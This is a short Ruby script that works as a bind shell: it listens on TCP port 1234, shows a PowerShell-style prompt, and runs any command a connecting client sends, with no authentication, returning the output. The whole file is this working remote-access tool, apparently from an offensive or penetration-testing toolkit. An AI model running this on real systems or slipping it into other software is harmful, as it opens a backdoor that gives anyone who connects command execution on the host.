require 'socket'
require 'open3'

port = 1234 # Change to bind port
server = TCPServer.new port

loop do
  client = server.accept
  loop do
    begin
      prefix = 'PS ' + `pwd`.strip + '> '
      client.print prefix
      cmd = client.gets
      break if cmd == nil
      if cmd[0,2] == 'cd'
        Dir.chdir cmd[3..-1].strip
      else
        stdout, stderr, status = Open3.capture3(cmd)
        client.puts stdout
      end
    rescue => e
      client.puts("Ruby Error : " + e.to_s)
    end
  end
  client.close
end
